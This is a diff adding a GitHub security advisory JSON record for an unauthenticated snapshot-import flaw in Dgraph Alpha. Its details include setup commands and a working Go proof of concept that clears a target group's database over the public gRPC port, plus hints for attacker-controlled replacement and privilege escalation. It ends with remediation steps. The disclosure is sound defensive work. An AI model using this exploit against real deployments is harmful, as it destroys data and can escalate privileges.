@@ -1,0 +1,54 @@
+{
+  "id": "GHSA-rrwh-6jrq-wp5v",
+  "modified": "2026-08-20T17:45:07.174937756Z",
+  "published": "2026-08-20T17:29:00Z",
+  "aliases": [
+    "CVE-2026-54061"
+  ],
+  "summary": "Dgraph Alpha group stores can be replaced via unauthenticated external snapshot import",
+  "details": "## Summary\n\nDgraph Alpha exposes the RPCs used for external snapshot import on the public gRPC port `:9080` without authentication or authorization. As a result, an unauthenticated network client can open `StreamExtSnapshot` and send Badger stream data to the target group’s store. In addition, the receiver calls `Prepare()` before processing the stream. This operation deletes and replaces the existing DB data.\n\n## Root Cause\n\nThe root cause is that the RPCs used for external snapshot import are exposed through Alpha’s public gRPC service, but no administrator authorization check is performed before reaching destructive storage operations.\n\nStreaming RPCs such as `StreamExtSnapshot` do not have a stream interceptor, and the RPC handlers do not perform their own authorization checks. As a result, an unauthenticated client that can reach the public gRPC port can start the import flow. Dgraph then calls Badger’s `StreamWriter.Prepare()` on the target group store. This operation deletes the existing database, allowing the attacker’s stream to potentially replace the store.\n\n## Steps to Reproduce\n\nPreconditions:\n\n- A throwaway Dgraph Alpha is reachable on its public gRPC port, default `:9080`\n- Public gRPC mTLS is not enabled\n- No Dgraph ACL token, JWT, or gRPC `auth-token` metadata is used by the client\n\n1. Start a throwaway standalone Dgraph instance from the tested build and insert synthetic data.\n\n```bash\n# Example if the tested source tree is built and tagged locally.\ndocker run --rm -p 8080:8080 -p 9080:9080 \\\n  -v \"$PWD/dgraph-ext-snapshot-poc:/dgraph\" \\\n  dgraph-standalone:2b6d6328d\n```\n\nFor example, insert a harmless record.\n\n```bash\ncurl -sS -X POST \"http://127.0.0.1:8080/mutate?commitNow=true\" \\\n  -H \"Content-Type: application/rdf\" \\\n  --data-binary $'{ set { _:poc \u003cname\u003e \"before-import\" . } }'\n```\n\n2. From an unauthenticated client, open `Dgraph.StreamExtSnapshot` and select group 1 as the target group.\n\n```go\npackage main\n\nimport (\n    \"context\"\n    \"fmt\"\n    \"io\"\n    \"log\"\n\n    \"github.com/dgraph-io/dgo/v250\"\n    \"github.com/dgraph-io/dgo/v250/protos/api\"\n)\n\nfunc main() {\n    ctx := context.Background()\n\n    // No JWT or auth metadata is attached.\n    dg, err := dgo.Open(\"dgraph://127.0.0.1:9080\")\n    if err != nil {\n        log.Fatal(err)\n    }\n    defer dg.Close()\n\n    client := dg.GetAPIClients()[0]\n    stream, err := client.StreamExtSnapshot(ctx)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    if err := stream.Send(\u0026api.StreamExtSnapshotRequest{GroupId: 1}); err != nil {\n        log.Fatal(err)\n    }\n    if _, err := stream.Recv(); err != nil {\n        log.Fatal(err)\n    }\n\n    // Complete an empty external snapshot stream. On the server side,\n    // the local subscriber calls StreamWriter.Prepare() before consuming\n    // packets from the stream.\n    if err := stream.Send(\u0026api.StreamExtSnapshotRequest{\n        Pkt: \u0026api.StreamPacket{Done: true},\n    }); err != nil {\n        log.Fatal(err)\n    }\n\n    for {\n        resp, err := stream.Recv()\n        if err == io.EOF {\n            break\n        }\n        if err != nil {\n            log.Fatal(err)\n        }\n        if resp.GetFinish() {\n            fmt.Println(\"unauthenticated external snapshot stream finished\")\n            break\n        }\n    }\n}\n```\n\nObserved result:\n\n- The unauthenticated stream is accepted.\n- No prior `UpdateExtSnapshotStreamingState(Start)` call is required.\n- `worker.runLocalSubscriber(...)` calls `pstore.NewStreamWriter().Prepare()`.\n- Badger drops the existing target group DB before the stream completes.\n- The synthetic data that existed before the stream is no longer served from the cleared group store.\n\nThe official import client demonstrates the same wire format and call order: `dgraph/cmd/dgraphimport/import_client.go` opens `dgo.Open(...)`, calls `StreamExtSnapshot`, sends a first `GroupId` message, and then streams `api.StreamPacket.Data` chunks followed by `Done: true`.\n\nThis Done-only PoC demonstrates unauthenticated clear/empty replacement of the selected group store. To additionally demonstrate attacker-controlled non-empty replacement, send valid Badger stream chunks in `api.StreamPacket.Data` before `Done: true`.\n\n## Impact\n\nAn unauthenticated attacker who can reach Alpha’s public gRPC port can clear a selected Dgraph group store or replace it with attacker-supplied Badger stream data. In ACL-enabled deployments, group 1 stores Dgraph’s ACL/internal predicates, so replacing group 1 may also lead to privilege escalation.\n\n## Suggested Remediation\n\n1. Require administrator authorization before `UpdateExtSnapshotStreamingState` calls `worker.ProposeDrain(...)`.\n2. Require the same authorization at the start of `StreamExtSnapshot` using `stream.Context()`.\n3. Add a gRPC stream interceptor so streaming RPCs receive the same auth and audit treatment as unary RPCs.\n4. Reject `StreamExtSnapshot` unless import mode was explicitly armed by an authorized request.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/dgraph-io/dgraph/v25",
+        "purl": "pkg:golang/github.com/dgraph-io/dgraph/v25"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "25.3.5"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 25.3.4",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-rrwh-6jrq-wp5v/GHSA-rrwh-6jrq-wp5v.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/dgraph-io/dgraph/security/advisories/GHSA-rrwh-6jrq-wp5v"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-54061"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/dgraph-io/dgraph"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/dgraph-io/dgraph/releases/tag/v25.3.5"
+    }
+  ]
+}
